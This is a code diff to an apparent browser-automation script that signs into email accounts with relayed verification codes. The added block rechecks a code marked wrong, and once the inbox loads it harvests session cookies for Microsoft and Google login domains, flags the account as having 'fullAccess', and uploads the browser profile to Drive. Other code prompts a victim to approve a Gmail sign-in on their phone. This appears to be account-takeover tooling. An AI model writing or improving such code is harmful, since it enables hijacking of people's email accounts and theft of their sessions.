@@ -2284,7 +2284,102 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 }
 
                                 if (codeErrorDetected) {
-                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Incorrect code. Remaining on code entry screen.`);
+                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Code error selector detected. Running safety check before marking incorrect...`);
+                                    // SAFETY: Wait for page to settle, then verify we actually remain on code entry
+                                    await new Promise(res => setTimeout(res, 5000));
+
+                                    // Check 1: Did we reach the inbox directly?
+                                    const postErrorInbox = await isInbox(page, platformConfig).catch(() => false);
+                                    if (postErrorInbox) {
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Code was correct despite error flash. Inbox reached.`);
+                                        finalStatus = "COMPLETED";
+                                        codeSuccessfullyProcessed = true;
+
+                                        const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                        updateData.status = "COMPLETED";
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        updateData.verified = true;
+                                        updateData.fullAccess = true;
+                                        updateData.lastJsonResponse = JSON.stringify({
+                                            browserId, email, status: "COMPLETED",
+                                            emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                            reachedInbox: true, requiresVerification: false,
+                                            verified: true, fullAccess: true,
+                                            platform, timestamp: new Date().toISOString(),
+                                            message: "Code accepted despite error flash. Reached inbox."
+                                        });
+
+                                        if (browser) {
+                                            if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
+                                            logger.info(`[processRow][${browserId}] Closing browser after successful verification (error-flash safety).`);
+                                            await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                                            browserFullyClosed = true;
+                                            activeBrowserSessions.delete(browserId);
+                                            await new Promise(resolve => setTimeout(resolve, 2000));
+                                        }
+
+                                        try {
+                                            const uploadedUrl = await uploadBrowserData(browserId);
+                                            if (uploadedUrl) updateData.driveUrl = uploadedUrl;
+                                        } catch (uploadError) {
+                                            logger.error(`[processRow][${browserId}] Error during Drive upload after safety check: ${uploadError.message}`);
+                                        }
+
+                                        if (updateData.driveUrl && userDataDir) {
+                                            try { await fs.remove(userDataDir); } catch (e) {}
+                                        }
+                                        break;
+                                    }
+
+                                    // Check 2: Page moved past code entry (e.g. into additional views)?
+                                    const postErrorState = await checkVerification(page, platformConfig).catch(() => ({ required: true, type: 'code' }));
+                                    if (!postErrorState.required || postErrorState.type !== 'code') {
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Page moved past code entry despite error flash. Handling additional views...`);
+                                        await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
+                                        const inboxAfterViews = await isInbox(page, platformConfig).catch(() => false);
+                                        if (inboxAfterViews) {
+                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after additional views. Setting COMPLETED.`);
+                                            finalStatus = "COMPLETED";
+                                            codeSuccessfullyProcessed = true;
+
+                                            const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
+                                            updateData.status = "COMPLETED";
+                                            updateData.cookieJSON = JSON.stringify(browserCookies);
+                                            updateData.verified = true;
+                                            updateData.fullAccess = true;
+                                            updateData.lastJsonResponse = JSON.stringify({
+                                                browserId, email, status: "COMPLETED",
+                                                emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                                reachedInbox: true, requiresVerification: false,
+                                                verified: true, fullAccess: true,
+                                                platform, timestamp: new Date().toISOString(),
+                                                message: "Code accepted. Reached inbox after additional views."
+                                            });
+
+                                            if (browser) {
+                                                if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
+                                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                                                browserFullyClosed = true;
+                                                activeBrowserSessions.delete(browserId);
+                                                await new Promise(resolve => setTimeout(resolve, 2000));
+                                            }
+
+                                            try {
+                                                const uploadedUrl = await uploadBrowserData(browserId);
+                                                if (uploadedUrl) updateData.driveUrl = uploadedUrl;
+                                            } catch (uploadError) {
+                                                logger.error(`[processRow][${browserId}] Error during Drive upload after views check: ${uploadError.message}`);
+                                            }
+
+                                            if (updateData.driveUrl && userDataDir) {
+                                                try { await fs.remove(userDataDir); } catch (e) {}
+                                            }
+                                            break;
+                                        }
+                                    }
+
+                                    // Confirmed still on code entry — mark as incorrect
+                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Confirmed incorrect code after safety check. Remaining on code entry screen.`);
                                     const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                                     if (platform === 'gmail' && ljp.viewName === 'sh Gmail 2-Step Verification') {
                                         ljp.gmail = { step: "waiting_app_notification", canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." };
